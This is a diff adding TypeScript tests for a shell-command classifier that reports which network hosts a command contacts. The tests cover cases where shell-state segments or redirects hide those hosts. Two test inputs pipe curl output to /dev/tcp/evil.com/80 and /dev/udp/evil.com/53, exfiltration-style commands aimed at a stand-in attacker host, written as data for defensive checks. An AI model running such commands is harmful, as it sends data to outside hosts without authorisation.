@@ -144,3 +144,32 @@ describe('finding paths use the same spelling as the inside check', () => {
     }
   });
 });
+
+describe('hosts in whole lines', () => {
+  const netHosts = (cmd: string) =>
+    classifyCommand(cmd, ctx).findings.find((f) => f.action === 'network')?.hosts;
+  it('shell-state segments hide every host', () => {
+    for (const cmd of [
+      '. ./vars.sh; curl https://ok.com',
+      'source ./vars.sh && curl https://ok.com',
+      'read -r https_proxy <<< x; curl https://ok.com',
+      'f() { :; }; curl https://ok.com',
+      'printf -v http_proxy x; curl https://ok.com',
+      'eval x; curl https://ok.com',
+    ]) {
+      expect(netHosts(cmd), cmd).toBeUndefined();
+    }
+  });
+  it('a redirect on the segment hides its hosts', () => {
+    expect(netHosts('curl https://ok.com > /dev/tcp/evil.com/80')).toBeUndefined();
+    expect(netHosts('curl https://ok.com 2>/dev/udp/evil.com/53')).toBeUndefined();
+  });
+  it('plain curl keeps its host', () => {
+    expect(netHosts('curl -sSL https://ok.com')).toEqual(['ok.com']);
+  });
+  it('identical network findings of a segment are de-duplicated', () => {
+    const c = classifyCommand('curl https://ok.com', ctx);
+    const keys = c.findings.map((f) => `${f.action}|${f.part}|${f.segment}`);
+    expect(new Set(keys).size).toBe(keys.length);
+  });
+});
